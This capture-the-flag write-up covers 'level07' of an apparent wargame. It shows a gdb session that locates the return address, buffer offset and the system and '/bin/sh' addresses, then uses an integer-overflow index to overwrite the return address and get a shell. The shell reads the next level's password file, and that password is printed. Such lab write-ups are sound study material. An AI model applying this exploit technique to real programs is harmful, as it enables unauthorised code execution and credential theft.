The binary lets us write number in unsigned values almost anywhere we want. So we basically want to write on the eip of main to jump into system with `/bin/sh`. \
Let's see that in action:
```
$ # lets setup our env
$ export SH=/bin/sh

$ # we break at the ret instruction in main
(gdb) b *main+718
Breakpoint 1 at 0x80489f1

$ # we get to the breakpoint with the quit command
(gdb) r
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: quit

Breakpoint 1, 0x080489f1 in main ()

(gdb) x/wx $esp
0xffffdc2c:     0xf7e45513
|_ this is our eip               

$ # which points to the next instruction in the libc wrapper
(gdb) x/wx 0xf7e45513
0xf7e45513 <__libc_start_main+243>:     0xe8240489

$ # now lets get the address to the start of the buffer
(gdb) b *main+110
Breakpoint 3 at 0x8048791

(gdb) r
Breakpoint 3, 0x08048791 in main ()

(gdb) x/wx $esp+0x24
0xffffda64:     0x00000000
|_ buffer starts here

(gdb) p 0xc2c - 0xa64
$1 = 456
     |_ divided by 4, it will give 114 which is the index we need to specify to write to the eip

$ # now lets get the infos we want
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) find __libc_start_main,+9999999,"/bin/sh"
0xf7f897ec

(gdb) p 0xf7e6aed0
$3 = 4159090384
     |_ this is system as an uint32

(gdb) p 0xf7f897ec
$4 = 4160264172
     |_ this is our /bin/sh address as an uint32
```

The index we pass in parameter will be multiplied by 4 to get the index to the zone. \
Unfortunately if we try to write the eip by specifying the index 114, we got the 'Reserved for wil message'. \
But by doing a little int overflow, we managed to write at this address anyway ! 

```
bash$ python -c 'print (0xffffffff + 1) / 4 + 114'
1073741938

bash$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4160264172
 Index: 116                     # we store /bin/sh in the address where system will look for its argument
 Completed store command successfully
Input command: store
 Number: 4159090384
 Index: 1073741938              # write the eip with system
 Completed store command successfully
Input command: quit             # quit to ret
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

